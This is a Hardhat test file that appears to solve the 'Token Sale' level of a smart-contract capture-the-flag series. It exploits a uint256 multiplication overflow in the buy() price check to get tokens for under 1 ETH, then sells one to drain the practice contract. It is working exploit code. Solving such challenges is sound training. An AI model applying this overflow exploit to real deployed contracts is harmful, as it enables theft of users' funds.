import { SignerWithAddress as HardhatEthersSigner } from "@nomicfoundation/hardhat-ethers/signers";
import { expect } from "chai";
import hre from "hardhat";

import { TokenSaleChallenge, TokenSaleChallenge__factory } from "../typechain-types";

describe("9. Math -> Token Sale", function () {
  let owner: HardhatEthersSigner;
  let player: HardhatEthersSigner;
  let level: TokenSaleChallenge;
  const ETH_1 = BigInt(10 ** 18);

  beforeEach(async function () {
    [owner, player] = await hre.ethers.getSigners();
    player;

    const factory: TokenSaleChallenge__factory = new TokenSaleChallenge__factory(owner);
    level = await factory.deploy(await player.getAddress(), { value: hre.ethers.parseEther("1") });
    await level.waitForDeployment();
  });

  it("should be completed", async function () {
    // we have line require(msg.value == numTokens * PRICE_PER_TOKEN);
    // there is math overflow possible, we'll exploit it
    const intDivisionResult = hre.ethers.MaxUint256 / ETH_1;

    // to overflow uint256, we should (intDivisionResult + 1n) * ETH_1
    const numTokensToOverflow = intDivisionResult + 1n;
    const overflowMultResult =
      numTokensToOverflow * ETH_1 - hre.ethers.MaxUint256 - 1n; /* first uint256 value iz zero */

    // so we'll spend less than 1 ETH to get a lot of tokens each costs 1 ETH
    expect(overflowMultResult).to.be.lessThan(ETH_1);

    const tx = await level.connect(player).buy(numTokensToOverflow, { value: overflowMultResult });
    await expect(tx).to.be.not.reverted;
    await tx.wait();

    // numTokensToOverflow tokens added
    expect(await level.balanceOf(player)).to.be.eq(numTokensToOverflow);

    // level balance increased by overflowMultResult
    expect(await hre.ethers.provider.getBalance(level)).to.be.eq(ETH_1 + overflowMultResult);

    // level will transfer: msg.sender.transfer(numTokens * PRICE_PER_TOKEN);
    // we should ensure that it will have enough balance to fullfill requested transfer
    // we know that level has 1 ETH + something < 2 ETH
    const tx1 = await level.connect(player).sell(1);
    await expect(tx1).to.be.not.reverted;
    await tx1.wait();

    expect(await hre.ethers.provider.getBalance(await level.getAddress())).to.be.lessThan(ETH_1);
    expect(await level.isComplete()).to.be.true;
  });
});
